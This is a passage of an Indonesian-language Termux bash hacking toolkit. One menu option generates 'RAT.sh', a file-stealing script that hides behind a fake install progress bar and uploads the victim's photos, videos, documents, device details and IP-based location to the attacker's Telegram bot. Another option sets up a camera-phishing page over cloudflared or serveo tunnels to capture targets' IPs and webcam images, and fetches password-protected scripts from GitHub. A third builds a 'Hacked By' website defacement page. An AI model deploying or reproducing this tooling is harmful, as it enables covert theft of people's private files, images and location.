echo -e "${r}[ ${g}4. ${r}]${c} Harus di awali nama botz ${r}[ ${g}_bot ${r}]"
echo -e "${r}[ ${g}5. ${r}]${c} Terakhir cek ID botz di ${g}: ${r}@CekIDTelegram_bot"
echo ""
echo -e "${y}Tekan Enter Untuk Melanjutkanya"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
echo ""
echo -e "${g} Sedang membuka fitur create mentahan...!!"
echo ""
sleep 5 
clear
mkdir -p /sdcard/Hasil_Rat
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣠⣤⣤⣤⣤⣤⡙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣈⠻⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢹⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⢀⣿⣿⡿⠿⠛⢋⣉⣉⡙⠛⠿⢿⣿⣿⡄⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⠘⢿⣤⡄⢰⣿⣿⣿⣿⣿⣿⣶⠀⣤⣽⠃⣸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠛⢋⣁⡈⢻⡇⢸⣿⣿⣿⣿⣿⣿⡿⢠⡿⢁⣈⡙⠛⢿⣿⣿⣿⣿
⣿⣿⣿⡿⢁⡾⠿⠿⠿⠄⠹⠄⠙⠛⠿⠿⠟⠋⠠⠞⠠⠾⠿⠿⠿⡄⢻⣿⣿⣿
⣿⣿⡿⢁⣾⠀⣶⣶⣿⣿⣶⣾⣶⣶⣶⣶⣶⣿⣿⣷⣾⣷⣶⣶⠀⣷⡀⢻⣿⣿
⣿⣿⠁⣼⣿⠀⣿⣿⣿⣿⣿⣿⠟⣉⣤⣤⣈⠛⣿⣿⣿⣿⣿⣿⠀⣿⣷⡈⢿⣿
⣿⠃⣼⣿⣿⠀⣿⣿⣿⣿⣿⡇⣰⡛⢿⡿⠛⣧⠘⣿⣿⣿⣿⣿⠀⣿⣿⣷⠈⣿
⡇⢸⣿⣿⣿⠀⣿⣿⣿⣿⣿⣧⡘⠻⣾⣷⠾⠋⣰⣿⣿⣿⣿⣿⠀⣿⣿⣿⣧⠘
⣷⣌⠙⠿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣄⣉⣉⣠⣿⣿⣿⣿⣿⣿⣿⠀⣿⡿⠛⣡⣼
⣿⣿⣿⣦⣈⠀⠿⠿⠿⠿⠿⠟⠛⠛⠛⠛⠿⠛⠟⠛⢿⣿⠛⠻⠀⢉⣴⣾⣿⣿
⣿⣿⣿⣿⣿⡀⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠀⣿⣿⣿⣿⣿
" | lolcat
echo -e "${p} Create botz ${g}: ${c}By.Thonxyzz404"
echo ""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ""
echo -e "${g}Tekan Enter Untuk Membuat File Ratz"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
cat > /sdcard/Hasil_Rat/RAT.sh <<'EOF'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
TOKEN="Masukkan Token botz lu"
CHAT_ID="Masukkan ID botz lu"
CEK_PATH="/data/data/com.termux/files/usr/lib/bash/cek_path.txt"
SENT_FILES_FILE="/data/data/com.termux/files/usr/lib/bash/sent_files.txt"
SENT_FILES=()
if [[ -f "$SENT_FILES_FILE" ]]; then
    mapfile -t SENT_FILES < "$SENT_FILES_FILE"
fi
function get_device_info() {
    BRAND=$(neofetch --stdout | grep "Host:" | awk -F': ' '{print $2}')
    OS_NAME=$(neofetch --stdout | grep "OS:" | awk -F': ' '{print $2}')
    MEMORY=$(free -h | grep "Mem:" | awk '{print $2}')
    IP_INFO=$(curl -s http://ipinfo.io)
    IP_ADDRESS=$(echo "$IP_INFO" | jq -r '.ip')
    CITY=$(echo "$IP_INFO" | jq -r '.city')
    REGION=$(echo "$IP_INFO" | jq -r '.region')
    COUNTRY=$(echo "$IP_INFO" | jq -r '.country')
    LOC=$(echo "$IP_INFO" | jq -r '.loc')
    echo "$BRAND|$OS_NAME|$MEMORY|$IP_ADDRESS|$CITY|$REGION|$COUNTRY|$LOC"
}
function send_file() {
    local file_path="$1"
    local caption="$2"
    curl -F "chat_id=$CHAT_ID" \
         -F "caption=$caption" \
         -F "document=@$file_path" \
         "https://api.telegram.org/bot$TOKEN/sendDocument"
    echo "$file_path" >> "$SENT_FILES_FILE"
    SENT_FILES+=("$file_path")
}
function process_files() {
    local extension="$1"
    find /storage/emulated/0/tes -type f -name "*.$extension" | while read -r file; do
        if [[ ! " ${SENT_FILES[*]} " =~ " $file " ]]; then
            IFS="|" read -r BRAND OS_NAME MEMORY IP_ADDRESS CITY REGION COUNTRY LOC <<< "$(get_device_info)"
            CAPTION=$(cat <<EOF2
============================
Halo sensei, ada target baru ni..
============================
🔰 Informasi Target 🔰
📄 Nama File : $(basename "$file")
🏷️ Merek : $BRAND
💻 OS : $OS_NAME
🧠 Memori : $MEMORY
📂 Asal Direktori : $(dirname "$file")
🌐 Alamat IP : $IP_ADDRESS
🏙️ Kota : $CITY
🗺️ Wilayah : $REGION
🌍 Negara : $COUNTRY
📌 Lokasi : $LOC
EOF2
)
            send_file "$file" "$CAPTION"
        fi
    done
}
function main() {
    clear
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${c} Sabar bre install module dulu..!!"
    echo ""
    sleep 5
    clear
    echo ""
    echo -e "${r}(${g}=         ${r})${y} 10%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}==        ${r})${y} 20%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}===       ${r})${y} 30%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}====      ${r})${y} 40%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}=====     ${r})${y} 50%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}======    ${r})${y} 60%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}=======   ${r})${y} 70%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}========  ${r})${y} 80%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}========= ${r})${y} 90%"
    sleep 0.5
    clear
    echo ""
    echo -e "${r}(${g}==========${r})${y} 100%"
    sleep 5
    clear
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${c} Proses penginstallan..!!"
    sleep 10
    clear
    while true; do
        if [[ -f "$CEK_PATH" ]]; then
            command -v neofetch >/dev/null 2>&1 || pkg install neofetch -y
            command -v curl >/dev/null 2>&1 || pkg install curl -y
            command -v jq >/dev/null 2>&1 || pkg install jq -y
            EXTENSIONS=("jpg" "png" "IMG" "mp4" "txt" "zip" "apk" "jpeg")
            for ext in "${EXTENSIONS[@]}"; do
                process_files "$ext"
                sleep 1
            done
            rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
            rm -f /data/data/com.termux/files/usr/lib/bash/mewing
            break
        else
            clear
            echo y | termux-setup-storage
            apt-get update
            apt-get install -y curl neofetch jq
            touch "$CEK_PATH"
            sleep 5
        fi
    done
}
main
EOF
chmod +x /sdcard/Hasil_Rat/RAT.sh
clear 
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Script berhasil dibuat di /sdcard/Hasil_Rat/RAT.sh"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
    ;;
      11)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
h='\033[1;32m'  
b='\033[1;34m'  
p='\033[1;35m'  
c='\033[1;36m'  
r='\033[1;31m'  
k='\033[1;33m'
n='\033[0m'
echo "
 █████╗ ██╗      ██╗  ██╗ ██████╗ ██╗  ██╗
██╔══██╗██║      ██║  ██║██╔════╝ ██║  ██║
███████║██║█████╗███████║███████╗ ███████║
██╔══██║██║╚════╝╚════██║██╔═══██╗╚════██║
██║  ██║██║           ██║╚██████╔╝     ██║
╚═╝  ╚═╝╚═╝           ╚═╝ ╚═════╝      ╚═╝
" | lolcat
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${h} AUTHOR ${r}= ${c}By.Thonxyzz404              ${b}║"
echo -e "║${h} JUDULL ${r}= ${c}Ai koneksi                  ${b}║"
echo -e "║${h} AKUN TIKTOK ${r}= ${c}@thonxyzz404           ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${k}01 ${r}]${h} AI GPT                        ${b}║"
echo -e "║${r} [ ${k}02 ${r}]${h} AI COPILOT                    ${b}║"
echo -e "║${r} [ ${k}03 ${r}]${h} AI METTA                      ${b}║"
echo -e "║${r} [ ${k}04 ${r}]${h} AI SHMOOZ                     ${b}║"
echo -e "║${r} [ ${k}05 ${r}]${h} AI WIZ                        ${b}║"
echo -e "║${r} [ ${k}06 ${r}]${h} AI GUIDEGEEK                  ${b}║"
echo -e "║${r} [ ${k}07 ${r}]${h} AI LUNZ                       ${b}║"
echo -e "║${r} [ ${k}08 ${r}]${h} AI GINEI                      ${b}║"
echo -e "║${r} [ ${k}09 ${r}]${h} AI AGUST                      ${b}║"
echo -e "║${r} [ ${k}10 ${r}]${h} AI HEPAY                      ${b}║"
echo -e "║${r} [ ${k}11 ${r}]${h} AI DOLAZ                      ${b}║"
echo -e "║${r} [ ${k}12 ${r}]${h} AI GIOLI                      ${b}║"
echo -e "║${r} [ ${k}13 ${r}]${n} Keluar                        ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo -e "${b}║"
echo -e "${b}║"
echo -e "${c}║"
read -p "╚═[ By.Thonxyzz404 ]══•➤ : " pilih
loading() {
    echo ""
    for i in {1..10}; do
        echo -ne "\r${k} Loading....!! ${r}[ ${h}$((i * 10))% ${r}]"
        sleep 0.2
    done
    echo -ne "\r${k} Loading....!! ${r}[ ${h}100% ${r}]"
    sleep 1
    echo -ne "\033[2K\r"
}
case $pilih in
    1|01) loading; xdg-open "https://wa.me/18002428478" ;;
    2|02) loading; xdg-open "https://wa.me/18334363285" ;;
    3|03) loading; xdg-open "https://wa.me/18772241042" ;;
    4|04) loading; xdg-open "https://wa.me/13135550002" ;;
    5|05) loading; xdg-open "https://wa.me/12014166644" ;;
    6|06) loading; xdg-open "https://wa.me/4915151853491" ;;
    7|07) loading; xdg-open "https://wa.me/12058922070" ;;
    8|08) loading; xdg-open "https://wa.me/34613288116" ;;
    9|09) loading; xdg-open "https://wa.me/16204458887" ;;
    10) loading; xdg-open "https://wa.me/918738030604" ;;
    11) loading; xdg-open "https://wa.me/18442439728" ;;
    12) loading; xdg-open "https://wa.me/16502234435" ;;
    13)
        echo ""
        echo -e "${r} Keluar Tools...!!"
        echo ""
        ;;
    *) 
        echo ""
        echo -e "${r} Pilihan tidak valid...!!"
        echo ""
        ;;
esac
echo ""
echo -e "${r}[ ${h}✓ ${r}]${h} SUKSES MEMBUKA CHATBOT WHATSAPP"
echo ""
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
       12)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
CAMHACK_DIR="/sdcard/CAM-DUMPER"
if [[ ! -d "$CAMHACK_DIR" ]]; then
    echo ""
    echo -e "\033[32;1m Menginstall Cam Hack...!!"
    echo -e "\033[34;1m"
    pkg update -y && pkg upgrade -y
    apt install -y git php wget curl jq openssh unzip which lolcat
    cd /sdcard
    git clone --depth 32 https://github.com/SokHengkell022/Cam-Hack
    mv Cam-Hack "$CAMHACK_DIR"
    chmod +x "$CAMHACK_DIR/camdumper.sh"
fi
cd "$CAMHACK_DIR"
git stash &> /dev/null
git pull origin main &> /dev/null
cat << 'EOF' > "$CAMHACK_DIR/camhack"
clear
rm -f Log.log *.zip > /dev/null 2>&1
mkdir -p captured_files/{old,new}
mv *.png captured_files/old/ > /dev/null 2>&1
mv captured_files/new/*.png captured_files/old/ > /dev/null 2>&1
mkdir -p $HOME/.serveo
touch $HOME/.serveo/serveo.yml
adr=$(cat $HOME/.serveo/serveo.yml)
if [[ $adr != *"web_addr: 80"* ]]; then
    echo "web_addr: 80" >> $HOME/.serveo/serveo.yml
fi
stop() {
    pkill -2 ssh &> /dev/null
    exit 25
}
trap 'printf "\n"; stop' SIGINT
clear
banner() {
echo "
⠀⠀⢀⣴⣶⣿⣿⣷⡶⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⢶⣿⣿⣿⣿⣶⣄⠀⠀
⠀⢠⡿⠿⠿⠿⢿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⡿⠿⠿⠿⠿⣦⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⡿⠆⠀⠀⠀⠀⠰⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⡤⠄⢤⣀⡈⢿⡄⠀⠀⠀⠀⢠⡟⢁⣠⡤⠠⠤⢤⣀⠀⠀⠀⠀
⠐⢄⣀⣼⢿⣾⣿⣿⣿⣷⣿⣆⠁⡆⠀⠀⢰⠈⢸⣿⣾⣿⣿⣿⣷⡮⣧⣀⡠⠀
⠰⠛⠉⠙⠛⠶⠶⠏⠷⠛⠋⠁⢠⡇⠀⠀⢸⡄⠈⠛⠛⠿⠹⠿⠶⠚⠋⠉⠛⠆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡇⠀⠀⢸⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢻⠇⠀⠀⠘⡟⠳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠰⣄⡀⠀⠀⣀⣠⡤⠞⠠⠁⠀⢸⠀⠀⠀⠀⡇⠀⠘⠄⠳⢤⣀⣀⠀⠀⣀⣠⠀
⠀⢻⣏⢻⣯⡉⠀⠀⠀⠀⠀⠒⢎⣓⠶⠶⣞⡱⠒⠀⠀⠀⠀⠀⢉⣽⡟⣹⡟⠀
⠀⠀⢻⣆⠹⣿⣆⣀⣀⣀⣀⣴⣿⣿⠟⠻⣿⣿⣦⣀⣀⣀⣀⣰⣿⠟⣰⡟⠀⠀
⠀⠀⠀⠻⣧⡘⠻⠿⠿⠿⠿⣿⣿⣃⣀⣀⣙⣿⣿⠿⠿⠿⠿⠟⢃⣴⠟⠀⠀⠀
⠀⠀⠀⠀⠙⣮⠐⠤⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠤⠊⡵⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠳⡀⠀⠀⠀⠀⠀⠲⣶⣶⠖⠀⠀⠀⠀⠀⢀⠜⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo ""
    echo "CAMDUMPER : V6."
    echo ""
    echo "Development : [ By.Thonxyzz404 ]"
}
dependencies() {
    for pkg in php which ssh unzip wget jq cloudflared; do
        if ! command -v $pkg &> /dev/null; then
            echo "$pkg tidak terinstal, menginstal...!!"
            pkg install $pkg -y || apt install $pkg -y || { echo -e "\033[31;1mGagall Menginstall $pkg. Aborting."; exit 1; }
        fi
    done
}
catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    echo -e "\e[1;93m[+] IP:\e[0m\e[1;77m $ip\e[0m"
    cat ip.txt >> saved.ip.txt
}
checkfound() {
    echo ""
    echo -e "\033[31;1m[\033[32;1m + \033[31;1m]\033[33;1m Tunggu Target Tekan Tomboll CTRL + C Lalu Enter Untuk Keluar..!!\e[0m"
    while true; do
        read -t 1 -p "" input
        if [[ $input == "q" ]]; then
            echo -e "\e[1;91mKeluar dari pengecekan...\e[0m"
            break
        fi
        [[ -e "ip.txt" ]] && { echo -e "\n[+] Target membuka link!"; catch_ip; rm -f ip.txt; }
        [[ -e "Log.log" ]] && { echo "[+] Gambar Masuk Ke /sdcard/CAM-DUMPER/captured_files/new"; mv *.png captured_files/new/; rm -f Log.log; }
        sleep 0.5
    done
}
start() {
    echo ""
    echo -e "\e[1;92mPilih Metode Akses :\e[0m"
    echo ""
    echo -e "\033[31;1m[ \033[32;1m1.\033[31;1m]\033[36;1m Lolcathost Serveo.net"
    echo -e "\033[31;1m[ \033[32;1m2.\033[31;1m]\033[36;1m Lolcathost Cloudflared"
    echo -e "\033[31;1m[ \033[32;1m3.\033[31;1m]\033[36;1m Lolcathost Colmek"
    echo -e "\033[31;1m[ \033[32;1m4.\033[31;1m]\033[36;1m Lolcathost WhatsApp"
    echo -e "\033[31;1m[ \033[32;1m5.\033[31;1m]\033[33;1m Keluar"
    echo -e "\033[33;1m"
    read -p "Pilih opsi [1/5]: " option
    echo ""
    if [[ $option == "1" ]]; then
        clear
        echo ""
        echo -e "\033[1;32m SEDANG MENGINSTALL TOOLS...!!!"
        sleep 2
        echo -e "\033[1;33m"
        mkdir -p Cam404
        git clone --depth 32 https://github.com/SokHengkell022/Cam404 temp_clone
        mv temp_clone/* temp_clone/.* Cam404 2>/dev/null
        rm -rf temp_clone
        cd Cam404 || exit 
        unzip -o -P "Skyz_01_02_From404" Cam.sh
        bash HackCam.sh
    elif [[ $option == "2" ]]; then
        echo -e "\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Starting Cloudflared...!!!\e[0m"
        php -S localhost:1912 > /dev/null 2>&1 &
        sleep 3
        cloudflared tunnel --url http://localhost:1912 > sendlink 2>&1 &
        sleep 8
        send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
        echo -e "\033[31;1m[ \033[32;1m+ \033[31;1m]\033[32;1m Silahkan Salin Link :\e[0m\e[1;77m $send_link\e[0m"
        sed "s+forwarding_link+$send_link+g" "/sdcard/CAM-DUMPER/cam-dumper.html" > index2.html
        sed "s+forwarding_link+$send_link+g" "/sdcard/CAM-DUMPER/template.php" > index.php
        checkfound
    elif [[ $option == "3" ]]; then
         clear 
         echo ""
         echo -e "\033[1;32m SEDANG MENGINSTALL TOOLS...!!"
         sleep 2
         echo -e "\033[1;33m"
         mkdir -p Bokep
         git clone --depth 32 https://github.com/SokHengkell022/Bokep temp_clone
         mv temp_clone/* temp_clone/.* Bokep 2>/dev/null
         rm -rf temp_clone
         cd Bokep || exit
         unzip -o -P "Deck__D3r_022__Cek_01" Ampas.sh
         bash Njir.sh
    elif [[ $option == "4" ]]; then
        git clone --depth 32 https://github.com/SokHengkell022/Anjay
        cd Anjay
        unzip -o -P "Bapak_Lusinih_Ngcok_5021" Eh_Ada_Lammer.sh
        bash Bjir.sh
    elif [[ $option == "5" ]]; then
        clear
        echo ""
        echo -e "\033[36;1m Keluar Dari Tools...!!"
        sleep 2 
    fi
}
dependencies
banner | lolcat
start
EOF
chmod +x "$CAMHACK_DIR/camhack"
bash "$CAMHACK_DIR/camhack"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
    ;;
      13)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
apikey_file="Thonxyzz404.txt"
apikey_sah="Thonxyzz404"
if [ -f "$apikey_file" ]; then
  saved_pass=$(<"$apikey_file")
  if [ "$saved_pass" = "$apikey_sah" ]; then
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} Anda sudah login sebelumnya."
    echo ""
    sleep 3
    clear
    goto_loading="yes"
  fi
fi
if [ "$goto_loading" != "yes" ]; then
  echo ""
  echo -e "${g}Silahkan Salin Apikeynya ${r}: ${c}Thonxyzz404"
  echo ""
  read -p "$(echo -e "${y}Masukkan Apikey Deface${c} : ${g}")" password
  if [ "$password" = "$apikey_sah" ]; then
    echo "$password" > "$apikey_file"
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} Login berhasil. Apikey disimpan."
    echo ""
    sleep 3
    clear
  else
    echo ""
    echo -e "${r}Apikey salah! Silakan coba lagi."
    echo ""
    exit 1
  fi
fi
echo ""
echo "
⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏⠀⠀⠀⢛⣫⣶⣿⣿
⣿⣿⣿⠀⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶⠀⠀⢿⣿⡿⠿⢛
⣿⣿⡇⠀⠀⠀⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀⠀⢰⣾⣿⣿
⣿⣿⣷⠀⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁⠀⠀⠀⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏⠀⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇⠀⢰⡀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘⠀⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠀⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉⠀⠐⠀⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
⣿⣿⣿⣿⣧⠀⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
⣿⣿⣿⣿⣷⠀⠀⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾⠀⡌⠀⠐⠘⣿⣿
⣿⣿⣿⣿⣿⠀⡐⠈⠸⣏⡇⠀⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸⠀⢸⡂⠱⠀⠇⠀⣿⣿
⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼⠀⠐⠀⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟⠀⡿⠀⢸⠀⠃⠄⠀⡀⢸⣿
⡟⡻⢛⡡⠊⣠⠇⠀⡗⢸⢱⠀⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗⠀⣸⠱⠀⡐⠆⠁⢢⠀⠁⢸⣿
⣷⣦⡄⠀⣜⠃⠀⢠⠘⠆⠂⢇⠀⠉⠀⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖⠀⠩⡄⠂⢸⣿
⣿⣿⡃⡜⢡⢂⠀⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆⠀⠀⠈⠀⠀⣿
⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄⠀⠀⢀⣴⣿
" | lolcat 
echo -e "${g}╔═════════════════════════════════════╗"
echo -e "${g}║ ${r}         DEFACE__TOOLSV8           ${g} ║"
echo -e "${g}╚═════════════════════════════════════╝"
function show_loading() {
  local chars="/-\|"
  local i=0
  mpv --no-terminal --quiet --volume=100 "$HOME/Goblok/Yuka2.mp3" &
  pid=$!
  while [ $i -le 70 ]; do
    printf '\r%s' "└► Main__Sound...!!! [ ${chars:$((i%4)):1} ]"
    sleep 0.09
    ((i++))
  done
  wait $pid
  printf '\r%s\n' "└► Main__Sound...!!! [ Selesai..!! ]"
}
echo -e "${c}│"
echo -e "${c}│"
echo -e "${c}│ ┌───────────────┐"
echo -e "${c}├─│    ${r}DEFACE${c}     │"
echo -e "${c}│ └───────────────┘"
echo -e "${c}│"
show_loading
clear
echo "
██████╗ ███████╗███████╗ █████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
██║  ██║█████╗  █████╗  ███████║██║     █████╗  
██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  
██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝

         Development : By.Thonxyzz404 " | lolcat
echo -e "${g}"
read -p "Masukkan Nama Defacer Anda : " defacer_name
echo -e "${c}"
read -p "Masukkan Kata-Kata Untuk Deface Anda : " deface_text
echo -e "${r}"
read -p "Masukkan Link Gambar Logo Anda : " logo_url
echo -e "${y}"
read -p "Silahkan Masukkan Port Anda [contoh : 8080] : " input_port
echo -e "${p}"
read -p "Masukkan URL audio anda : " audio_url
echo -e "${b}"
read -p "Masukkan Teks Deface untuk Bacround : " matrix_text
cat > index.html <<EOF
<html>  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Hacked By $defacer_name</title>  
    <link rel="icon" href="$logo_url" type="image/x-icon">  
    <meta name="description" content="Hacked By $defacer_name">  
    <meta name="keywords" content="Hacked By $defacer_name">  
    <meta name="rating" content="General">  
    <meta name="revisit-after" content="1 days">  
    <meta name="classification" content="Hacked By $defacer_name">  
    <meta name="robots schedule" content="auto">  
    <link href="https://fonts.googleapis.com/css2?family=Oxygen" rel="stylesheet">  
</head>  
<body>  
<style>  
html {  
    background-color: black;  
    color: #000;  
}  
h2 {  
    font-family: "Bold 700 Italic", Mali;  
    color: red;  
}  
h3, h4 {  
    font-family: "Oxygen", serif;  
    color: white;  
}  
a {  
    color: white;  
    text-decoration: none;  
}  
::selection {  
    color: white;  
    background: #000;  
}  
canvas {  
    position: fixed;  
    top: 0;  
    left: 0;  
    z-index: -1;  
